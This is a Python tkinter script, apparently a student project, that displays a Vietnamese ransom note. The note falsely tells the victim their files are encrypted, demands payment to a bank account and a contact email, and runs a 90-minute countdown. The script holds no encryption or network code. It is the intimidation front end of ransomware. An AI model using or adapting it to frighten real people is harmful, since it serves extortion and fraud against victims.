import tkinter as tk
from tkinter import ttk

def countdown(count):
    hour, minute, second = map(int, count.split(':'))
    label['text'] = f'{hour:02}:{minute:02}:{second:02}'
    
    if hour > 0 or minute > 0 or second > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, f'{hour}:{minute}:{second}')

# Create the main window
root = tk.Tk()
root.title('Thông Báo Ransomware')
root.configure(bg='black')

# Main frame to center all elements
main_frame = tk.Frame(root, bg='black')
main_frame.pack(expand=True)

# Title Frame
title_frame = tk.Frame(main_frame, bg="#34495E")
title_frame.pack(pady=20)

tk.Label(title_frame, text="THÔNG BÁO KHẨN CẤP", font=("Helvetica", 24, "bold"), fg="red").pack()

# Skull Icon
skull_label = tk.Label(main_frame, text="☠", font=("Arial", 50), fg="white", bg="black")
skull_label.pack(pady=20)

# Notification Text
notification_frame = tk.Frame(main_frame, bg="black")
notification_frame.pack(pady=10)

tk.Label(notification_frame, text="Tất cả các tệp của bạn đã bị mã hóa!", font=('Helvetica', 18, 'bold'), fg='red').pack()

# Message
message = """
Các tệp quan trọng của bạn, bao gồm tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác hiện không thể truy cập.
"""
message_label = tk.Label(notification_frame, text=message, font=("Arial", 12), fg="white", bg="#8B0000", justify="center", wraplength=650)
message_label.pack(pady=10)

# Instructions
instructions = """
Để khôi phục chúng, vui lòng gửi thanh toán vào tài khoản sau:\n\n
Tài khoản ngân hàng: VCB - 1234567890\n\n
Sau đó, gửi email cho chúng tôi với địa chỉ 'nhom4_ransomware@gmail.com' với ID giao dịch của bạn\n
"""
instructions_label = tk.Label(notification_frame, text=instructions, font=('calibri', 12), fg='yellow', bg='black', justify='center', wraplength=650)
instructions_label.pack(pady=5)

# Countdown Timer
label = tk.Label(main_frame, font=('calibri', 40, 'bold'), fg='red', bg='black')
label.pack(pady=5)

# Warning
warning_label = tk.Label(main_frame, 
                         text="Chú ý! Không đổi tên các tập tin được mã hóa.\n\n"
                              "Nỗ lực giải mã của bên thứ ba có thể dẫn đến mất dữ liệu vĩnh viễn.",
                         font=('calibri', 10, 'italic'), fg='red', bg='black', wraplength=650)
warning_label.pack(pady=5)

# Start countdown
countdown('01:30:00')

# Main loop
root.mainloop()
